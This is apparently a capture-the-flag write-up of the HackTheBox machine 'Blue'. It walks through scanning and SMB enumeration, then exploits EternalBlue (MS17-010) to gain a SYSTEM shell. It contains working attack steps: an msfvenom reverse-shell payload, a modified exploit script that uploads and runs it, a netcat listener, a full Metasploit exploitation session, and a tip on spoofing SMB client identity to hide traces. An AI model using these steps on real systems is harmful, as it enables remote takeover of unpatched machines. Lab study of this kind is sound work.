Table o' contents:

[Intro](#blue)

[Internet Presence](#internet-presence)

[Gateway](#gateway)

[Accessible Services](#accessible-services)

[Server Message Block](#server-message-block)

[The Shares](#the-shares)

[Disclosed System Information](#disclosed-system-information)

[Vulnerable OS Version](#vulnerable-os-version)

[Exploits](#exploits)

[pyenv Setup](#pyenv-setup)

[Running The Exploits](#running-the-exploits)
[Verbose Automation](#verbose-automation)


# Blue
**Blue** is an easy HackTheBox Windows box. Its simplicity lies in an SMBv1 service, vulnerable to the [EternalBlue](https://nordvpn.com/blog/what-is-eternalblue/) exploit. 

## Internet Presence
The spawned virtual machine is of ip address: "10.10.10.40".
I will save this value as a variable to be referenced with ease later.

```bash
ip="10.10.10.40"
```

The first thing I want to know is if the target responds to ICMP Echo messages, 
as it would confirm that the device is indeed online.

```bash
ping $ip -c 3
```
```
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=29.4 ms
64 bytes from 10.10.10.40: icmp_seq=2 ttl=127 time=33.7 ms
64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=37.6 ms

--- 10.10.10.40 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 29.417/33.589/37.625/3.352 ms
```

The device is indeed online.

## Gateway
Thanks to [zekosec](https://www.zekosec.com/blog/port-discover-without-nmap/)!

I scan the top 1000 ports with netcat:

```bash
nc -nvv -w 3 -z $ip 1-1000 2>&1 | grep -v "Connection refused"
```
```bash
(UNKNOWN) [10.10.10.40] 445 (microsoft-ds) open
(UNKNOWN) [10.10.10.40] 139 (netbios-ssn) open
(UNKNOWN) [10.10.10.40] 135 (epmap) open
 sent 0, rcvd 0
```

I also check if other, higher ports are open:

```bash
nc -nvv -w 3 -z $ip 1-65535 2>&1 | grep -v "Connection refused"
```
```bash
(UNKNOWN) [10.10.10.40] 49157 (?) open
(UNKNOWN) [10.10.10.40] 49156 (?) open
(UNKNOWN) [10.10.10.40] 49155 (?) open
(UNKNOWN) [10.10.10.40] 49154 (?) open
(UNKNOWN) [10.10.10.40] 49153 (?) open
(UNKNOWN) [10.10.10.40] 49152 (?) open
...
```
The high, non-standard ports are probably used by internal applications.
Therefore we really have 3 open ports:
* 445 (SMB over TCP/IP)
* 139 (SMB over NetBIOS)
* 135 (Windows RPC)

## Accessible Services

### Server Message Block
In order to enumerate the SMB service hosted on the machine, we can utilize the SMB client CLI-app "smbclient" from samba.

SMB is a file sharing protocol, so our target should be in enumerating the shares:

```bash
smbclient --workgroup=MYWORKGROUP --user=MYUSERNAME --netbiosname=MYNETBIOSNAME --no-pass --list $ip -d 10 2> scans/smbclient/debug-share-listing.txt 
```
Here I explicitly define my workgroup, username and netbiosname, because samba by default fetches values from the hostname and username, which would be "kali"
leaving blatant traces of an attack.
I also made sure to extract as much debugging information from the conversation as possible, which will be very helpful later.

#### The Shares
Available shares:
```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Share           Disk      
Users           Disk
```
```bash
...
[0000] 01 00 00 00 01 00 00 00   00 00 02 00 05 00 00 00   ........ ........
[0010] 04 00 02 00 05 00 00 00   08 00 02 00 00 00 00 80   ........ ........
[0020] 0C 00 02 00 10 00 02 00   00 00 00 80 14 00 02 00   ........ ........
[0030] 18 00 02 00 03 00 00 80   1C 00 02 00 20 00 02 00   ........ .... ...
[0040] 00 00 00 00 24 00 02 00   28 00 02 00 00 00 00 00   ....$... (.......
[0050] 2C 00 02 00 07 00 00 00   00 00 00 00 07 00 00 00   ,....... ........
[0060] 41 00 44 00 4D 00 49 00   4E 00 24 00 00 00 00 00   A.D.M.I. N.$.....
[0070] 0D 00 00 00 00 00 00 00   0D 00 00 00 52 00 65 00   ........ ....R.e.
[0080] 6D 00 6F 00 74 00 65 00   20 00 41 00 64 00 6D 00   m.o.t.e.  .A.d.m.
[0090] 69 00 6E 00 00 00 00 00   03 00 00 00 00 00 00 00   i.n..... ........
[00A0] 03 00 00 00 43 00 24 00   00 00 00 00 0E 00 00 00   ....C.$. ........
[00B0] 00 00 00 00 0E 00 00 00   44 00 65 00 66 00 61 00   ........ D.e.f.a.
[00C0] 75 00 6C 00 74 00 20 00   73 00 68 00 61 00 72 00   u.l.t. . s.h.a.r.
[00D0] 65 00 00 00 05 00 00 00   00 00 00 00 05 00 00 00   e....... ........
[00E0] 49 00 50 00 43 00 24 00   00 00 00 00 0B 00 00 00   I.P.C.$. ........
[00F0] 00 00 00 00 0B 00 00 00   52 00 65 00 6D 00 6F 00   ........ R.e.m.o.
[0100] 74 00 65 00 20 00 49 00   50 00 43 00 00 00 00 00   t.e. .I. P.C.....
[0110] 06 00 00 00 00 00 00 00   06 00 00 00 53 00 68 00   ........ ....S.h.
[0120] 61 00 72 00 65 00 00 00   01 00 00 00 00 00 00 00   a.r.e... ........
[0130] 01 00 00 00 00 00 00 00   06 00 00 00 00 00 00 00   ........ ........
[0140] 06 00 00 00 55 00 73 00   65 00 72 00 73 00 00 00   ....U.s. e.r.s...
[0150] 01 00 00 00 00 00 00 00   01 00 00 00 00 00 00 00   ........ ........
[0160] 05 00 00 00 30 00 02 00   00 00 00 00 00 00 00 00   ....0... ........
...

        out: struct srvsvc_NetShareEnumAll
            info_ctr                 : *
                info_ctr: struct srvsvc_NetShareInfoCtr
                    level                    : 0x00000001 (1)
                    ctr                      : union srvsvc_NetShareCtr(case 1)
                    ctr1                     : *
                        ctr1: struct srvsvc_NetShareCtr1
                            count                    : 0x00000005 (5)
                            array                    : *
                                array: ARRAY(5)
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'ADMIN$'
                                        type                     : STYPE_DISKTREE_HIDDEN (0x80000000)
                                        comment                  : *
                                            comment                  : 'Remote Admin'
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'C$'
                                        type                     : STYPE_DISKTREE_HIDDEN (0x80000000)
                                        comment                  : *
                                            comment                  : 'Default share'
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'IPC$'
                                        type                     : STYPE_IPC_HIDDEN (0x80000003)
                                        comment                  : *
                                            comment                  : 'Remote IPC'
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'Share'
                                        type                     : STYPE_DISKTREE (0x0)
                                        comment                  : *
                                            comment                  : ''
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'Users'
                                        type                     : STYPE_DISKTREE (0x0)
                                        comment                  : *
                                            comment                  : ''
            totalentries             : *
                totalentries             : 0x00000005 (5)
            resume_handle            : *
                resume_handle            : 0x00000000 (0)
            result                   : WERR_OK
```

We can now try to connect to these shares and enumerate the data they hold. I will refrain from that for now.

#### Disclosed System Information
Having a look into the description of the [nmap smb-os-discovery script](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), we see that it basically just catches 
info that is given to us by the server itself when we create a session. This would mean that it should be easily viewable for us:

```bash
TargetInfo               : *
    TargetInfo: struct AV_PAIR_LIST
        count                    : 0x00000006 (6)
        pair: ARRAY(6)
            pair: struct AV_PAIR
                AvId                     : MsvAvNbDomainName (0x2)
                AvLen                    : 0x0010 (16)
                Value                    : union ntlmssp_AvValue(case 0x2)
                AvNbDomainName           : 'HARIS-PC'
            pair: struct AV_PAIR
                AvId                     : MsvAvNbComputerName (0x1)
                AvLen                    : 0x0010 (16)
                Value                    : union ntlmssp_AvValue(case 0x1)
                AvNbComputerName         : 'HARIS-PC'
            pair: struct AV_PAIR
                AvId                     : MsvAvDnsDomainName (0x4)
                AvLen                    : 0x0010 (16)
                Value                    : union ntlmssp_AvValue(case 0x4)
                AvDnsDomainName          : 'haris-PC'
            pair: struct AV_PAIR
                AvId                     : MsvAvDnsComputerName (0x3)
                AvLen                    : 0x0010 (16)
                Value                    : union ntlmssp_AvValue(case 0x3)
                AvDnsComputerName        : 'haris-PC'
            pair: struct AV_PAIR
                AvId                     : MsvAvTimestamp (0x7)
                AvLen                    : 0x0008 (8)
                Value                    : union ntlmssp_AvValue(case 0x7)
                AvTimestamp              : Tue Aug 26 01:39:00 PM 2025 EDT
            pair: struct AV_PAIR
                AvId                     : MsvAvEOL (0x0)
                AvLen                    : 0x0000 (0)
                Value                    : union ntlmssp_AvValue(case 0x0)

```
```bash
Version: struct ntlmssp_VERSION
    ProductMajorVersion      : NTLMSSP_WINDOWS_MAJOR_VERSION_6 (0x6)
    ProductMinorVersion      : NTLMSSP_WINDOWS_MINOR_VERSION_1 (0x1)
    ProductBuild             : 0x1db1 (7601)
    Reserved                 : 000000
    NTLMRevisionCurrent      : NTLMSSP_REVISION_W2K3 (0xF)
```

From these two pieces of debugging info we see that the network name for the device is "haris-PC".
What is more important is the OS information - it is clear that the device is running Windows 6.1 .

BONUS: The hint that this is a Windows machine was embedded inside our [ping check][##internet-presence]. Windows OS is 
known to have the Time-To-Live packet value of 128 ( we saw 127 because of one middle device on the network).

## Vulnerable OS Version
Windows 6.1 ( more known by the name Windows 7 ) was one of the versions of Windows vulnerable to Eternal* exploits, like EternalBlue.
I will check whether the host is actually affected, or if it is patched.

### Exploits
The best exploits to use for Eternal* exploits are available [in worawit's repo](https://github.com/worawit/MS17-010]).
However, one massive problem with them is that they are no longer maintained to be compatible with the latest python version,
which makes them inusable for us without some previous setup:

```bash
python3.13 ./checker.py $ip
```
```bash
Target OS: Windows 7 Professional 7601 Service Pack 1
Traceback (most recent call last):
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/./checker.py", line 55, in <module>
    recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 262, in send_trans
    self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))
                  ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 259, in create_trans_packet
    return self.create_smb_packet(transCmd, mid, pid, tid)
           ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 230, in create_smb_packet
    return '\x00'*2 + pack('>H', len(req)) + req  # assume length is <65536
           ~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~
TypeError: can only concatenate str (not "bytes") to str
```
Python 3.x differs significantly with Python 2.x, one of those diffrences is the prohibition of joining bytes and strings directly.

The best way to combat this is to create a separate Python virtual environment on our host and install the old python version there.
A good and easy way to do so is through [pyenv](https://github.com/pyenv/pyenv).


#### pyenv Setup
Installation:
```bash
curl -fsSL https://pyenv.run | bash
```

Dependencies:
```bash
sudo apt update; sudo apt install make build-essential libssl-dev zlib1g-dev \
libbz2-dev libreadline-dev libsqlite3-dev curl git \
libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev
```

Shell Configuration: 
```bash
export PYENV_ROOT="$HOME/.pyenv"
export PATH="$PYENV_ROOT/bin:$PATH"
eval "$(pyenv init - bash)"
```
(temporary, needs to be ran inside every shell to use)

Target Python Version Install:
```bash
pyenv install -l
pyenv install 2.7.18
pyenv versions
* system (set by /home/kali/.pyenv/version)
  2.7.18
```

Virtual environment creation:
```bash
pyenv virtualenv 2.7.18 worawit-eternalblue
pyenv virtualenvs 
  2.7.18/envs/worawit-eternalblue (created from /home/kali/.pyenv/versions/2.7.18)
  worawit-eternalblue (created from /home/kali/.pyenv/versions/2.7.18)
```

Environment activation:
```bash
pyenv activate worawit-eternalblue
python --version
	Python 2.7.18
pip --version
	pip 20.3.4 from /home/kali/.pyenv/versions/2.7.18/envs/worawit-eternalblue/lib/python2.7/site-packages/pip (python 2.7)
```

We now have an older version of python, which will allow us to run the scripts.
However, aside from python itself, the scripts also utilize impacket. Impacket is absent from our virtual environment:
```bash
python ./checker.py 
Traceback (most recent call last):
  File "./checker.py", line 1, in <module>
    from mysmb import MYSMB
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 3, in <module>
    from impacket import smb, smbconnection
ImportError: No module named impacket
```

We need to install Impacket inside our virtual environment:
```bash
pip install impacket==0.9.22	# 0.9.24 relies on OpenSSL version incompatible with 2.7
python ./checker.py $ip
	Target OS: Windows 7 Professional 7601 Service Pack 1
	...
```

Everything is ready to go!

#### Running The Exploits
With my enviroment set up, I can return to testing the machine.
The "checker.py" script is used to check whether the machine is truly vulnerable to the CVE.
Inside the script, there are variables that hold the values of username and password we auth as:

```bash
USERNAME = ''
PASSWORD = ''
```

I will run the exploit with blank creds, as well as with probably invalid but not blank creds.

```bash
python ./checker.py $ip
```
```bash
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```

```bash
python ./checker-blankless-creds.py $ip
```
```bash
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)
```

With blank credentials we get a much more restricted environment than with just invalid creds!
Anyways, I have now comfirmed that the device is not patched - it is vulnerable.

I will utilize [this tutorial](https://redteamzone.com/EternalBlue/) to gain a shell on the target:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f exe > shell.exe
```

```bash
diff zzz_exploit.py zzz_exploit-modified.py
```
```bash
34,35c34,35
< USERNAME = ''
< PASSWORD = ''
---
> USERNAME = '1'
> PASSWORD = '1'
973,985c973,975
<       smbConn = conn.get_smbconnection()
< 
<       print('creating file c:\\pwned.txt on the target')
<       tid2 = smbConn.connectTree('C$')
<       fid2 = smbConn.createFile(tid2, '/pwned.txt')
<       smbConn.closeFile(tid2, fid2)
<       smbConn.disconnectTree(tid2)
< 
<       #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
<       #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
<       # Note: there are many methods to get shell over SMB admin session
<       # a simple method to get shell (but easily to be detected by AV) is
<       # executing binary generated by "msfvenom -f exe-service ..."
---
>     smbConn = conn.get_smbconnection()
>     smb_send_file(smbConn, 'shell.exe', 'C', '/test.exe')
>     service_exec(conn, r'c:\test.exe')
```

```bash
python ./zzz_exploit-modified.py $ip browser
```

```bash
nc -lvnp 443
```
```bash
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.40] 49171
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Verbose Automation
Having done the box with hands-on, generic network tools / specific exploit scripts, we can now relish in more automated testing.

Pinging the Target:
```bash
sudo nmap $ip -n -v -oN scans/nmap/ping_check.txt -sn -PE --packet-trace

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 05:43 EDT
Initiating Ping Scan at 05:43
Scanning 10.10.10.40 [1 port]
SENT (0.1177s) ICMP [10.10.16.4 > 10.10.10.40 Echo request (type=8/code=0) id=19205 seq=0] IP [ttl=52 id=55452 iplen=28 ]
RCVD (0.1520s) ICMP [10.10.10.40 > 10.10.16.4 Echo reply (type=0/code=0) id=19205 seq=0] IP [ttl=127 id=311 iplen=28 ]
Completed Ping Scan at 05:43, 0.15s elapsed (1 total hosts)
Nmap scan report for 10.10.10.40
Host is up (0.034s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
           Raw packets sent: 1 (28B) | Rcvd: 1 (28B)
```

Discovering Gateways:
```bash
sudo nmap $ip -n -v -oN scans/nmap/tcp/1000_top_ports.txt -Pn --disable-arp-ping --reason -sS -O --top-ports 1000

Nmap scan report for 10.10.10.40
Host is up, received user-set (0.049s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/22%OT=135%CT=1%CU=33273%PV=Y%DS=2%DC=I%G=Y%TM=687F5D
OS:C5%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=2%ISR=109%TI=I%CI=I%II=I%SS=S%TS
OS:=7)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=108%GCD=1%IS
OS:R=10A%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%II=I%S
OS:S=S%TS=7)SEQ(SP=108%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M542NW
OS:8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M5
OS:42ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%
OS:T=80%W=2000%O=M542NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.006 days (since Tue Jul 22 05:37:17 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
```

Server Message Block:
```bash
sudo nmap $ip -n -v -oN scans/nmap/tcp/microsoft-ds_version_default_script.txt -Pn --disable-arp-ping --reason -sS -sV --script=default -p 445

Nmap scan report for 10.10.10.40
Host is up, received user-set (0.034s latency).

PORT    STATE SERVICE      REASON          VERSION
445/tcp open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m56s, deviation: 34m36s, median: 2s
| smb2-time: 
|   date: 2025-07-22T14:27:20
|_  start_date: 2025-07-22T09:37:39
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-22T15:27:19+01:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
```
```bash
sudo nmap $ip -n -v -oN scans/nmap/tcp/microsoft-ds_vuln_script.txt -Pn --disable-arp-ping --reason -sS -sV --script=vuln -p 445

Nmap scan report for 10.10.10.40
Host is up, received user-set (0.033s latency).

PORT    STATE SERVICE      REASON          VERSION
445/tcp open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
```

Metasploit Exploitation:
```bash
msfconsole
msf6 > search eternalblue
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
```
```bash
msf6 > use 24
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 10.10.10.40
RHOST => 10.10.10.40
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```bash
msf6 > use 0                                                                                                         
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp                                         
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell_reverse_tcp                           
payload => windows/x64/shell_reverse_tcp                                                                             
msf6 exploit(windows/smb/ms17_010_eternalblue) > options                                                             
                                                                                                                                                                                                                                           
Module options (exploit/windows/smb/ms17_010_eternalblue):                                                           
                                                                                                                     
   Name           Current Setting  Required  Description                                                             
   ----           ---------------  --------  -----------                                                             
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl  
                                             oit/basics/using-metasploit.html                                        
   RPORT          445              yes       The target port (TCP)                      
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects   
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target                                                                                                                         
                                             machines.                                                               
   SMBPass                         no        (Optional) The password for the specified username                      
   SMBUser                         no        (Optional) The username to authenticate as                              
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.                                                                   
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.                                                                                                                             
                                                                                                                     
                                                                                                                     
Payload options (windows/x64/shell_reverse_tcp):                                                                                                                                                                                           
                                                                                                                     
   Name      Current Setting  Required  Description                                                                  
   ----      ---------------  --------  -----------                                                                  
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)                    
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)                           
   LPORT     4444             yes       The listen port                                                              
                                                                                                                     
                                                                                                                     
Exploit target:                                                                                                      
                                                                                                                                                                                                                                           
   Id  Name                                                                                                          
   --  ----                                                                                                          
   0   Automatic Target                                                                                              
                                                                                                                     
                                                                                                                     
                                                                                                                     
View the full module info with the info, or info -d command.                            
                                                                                                                     
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.16.5                                                                                                                                                                      
LHOST => 10.10.16.5                                                                                                  
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40                        
RHOSTS => 10.10.10.40                                                                                                
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```




